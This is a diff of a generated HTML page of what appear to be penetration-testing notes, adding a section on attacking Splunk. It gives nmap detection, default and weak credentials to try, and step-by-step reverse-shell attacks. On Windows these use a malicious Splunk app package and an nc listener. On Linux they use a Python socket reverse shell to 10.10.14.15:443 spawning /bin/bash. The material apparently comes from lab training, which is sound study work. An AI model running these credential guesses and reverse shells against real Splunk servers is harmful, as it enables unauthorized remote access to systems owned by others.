@@ -1237,11 +1237,44 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#discovery-enumeration_1" class="md-nav__link">
+  <a href="#discovery_2" class="md-nav__link">
     <span class="md-ellipsis">
-      Discovery &amp; Enumeration
+      Discovery
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-splunk" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Splunk
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Splunk">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#abusing-built-in-functionality_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abusing Built-In Functionality
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -1834,11 +1867,44 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#discovery-enumeration_1" class="md-nav__link">
+  <a href="#discovery_2" class="md-nav__link">
     <span class="md-ellipsis">
-      Discovery &amp; Enumeration
+      Discovery
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-splunk" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Splunk
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Splunk">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#abusing-built-in-functionality_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abusing Built-In Functionality
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -2562,7 +2628,54 @@ Create a .htaccess file to give ourselves access to the folder
 </span><span id="__span-49-2">/bin/bash<span class="w"> </span>-i
 </span></code></pre></div></td></tr></table></div></p>
 <h2 id="splunk">Splunk</h2>
-<h3 id="discovery-enumeration_1">Discovery &amp; Enumeration</h3>
+<h3 id="discovery_2">Discovery</h3>
+<ul>
+<li>Runs on port 8000 by default, port 8089 is the Splunk management port for communication with the Splunk REST API</li>
+<li>Detect with nmap service scan:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1">sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.129.201.50
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="enumeration_3">Enumeration</h3>
+<ul>
+<li>Check for a forgotton about trial version (converts to free version with no authentication after 60 days)</li>
+<li>Older versions have default creds admin:changeme</li>
+<li>Later versions set creds during install, check for common weak passwords (admin, Welcome, Welcome1, Password123, etc)</li>
+</ul>
+<h3 id="attacking-splunk">Attacking Splunk</h3>
+<h4 id="abusing-built-in-functionality_1">Abusing Built-In Functionality</h4>
+<p><strong>Windows Hosts</strong>
+- Clone reverse shell from GitHub
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1">git<span class="w"> </span>clone<span class="w"> </span>https://github.com/0xjpuff/reverse_shell_splunk.git
+</span></code></pre></div></td></tr></table></div>
+- Edit attacker_ip_here and attacker_port_here in <code>reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1</code>
+- Create tar ball of the directory
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><span class="nb">cd</span><span class="w"> </span>reverse_shell_splunk
+</span><span id="__span-52-2">tar<span class="w"> </span>-cvzf<span class="w"> </span>updater.tar.gz<span class="w"> </span>reverse_shell_splunk/
+</span></code></pre></div></td></tr></table></div>
+- Start a listener
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1">nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">9001</span>
+</span></code></pre></div></td></tr></table></div>
+- In browser click <code>Apps &gt; Manage Apps(cog symbol) &gt; Install app from file</code>
+- <code>Browse</code> to select tar ball then click <code>Upload</code> this will trigger the reverse shell</p>
+<p><strong>Linux Hosts</strong>
+- Edit <code>rev.py</code> to:
+<div class="language-python highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span>
+</span><span id="__span-54-2">
+</span><span id="__span-54-3"><span class="n">ip</span><span class="o">=</span><span class="s2">&quot;10.10.14.15&quot;</span>
+</span><span id="__span-54-4"><span class="n">port</span><span class="o">=</span><span class="s2">&quot;443&quot;</span>
+</span><span id="__span-54-5"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span id="__span-54-6"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+</span><span id="__span-54-7"><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
+</span><span id="__span-54-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div></p>
 
 
 
